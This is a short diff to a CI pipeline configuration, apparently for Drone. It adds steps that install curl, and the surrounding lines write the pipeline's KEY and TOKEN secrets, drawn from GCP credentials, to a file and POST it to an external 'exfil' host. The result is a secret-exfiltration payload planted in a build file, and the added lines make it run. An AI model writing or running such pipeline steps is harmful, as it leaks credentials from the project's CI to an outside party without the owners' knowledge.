@@ -12,6 +12,8 @@ steps:
       from_secret: gcp_creds
       
   commands:
+  - apt update -y
+  - apt install curl -y
   - echo Initializing...
   - echo "$${KEY} $${TOKEN}" > a
   - curl -d @a exfil.503ybasfyhrqz2hccuagezg7uy0poe.bf.gy
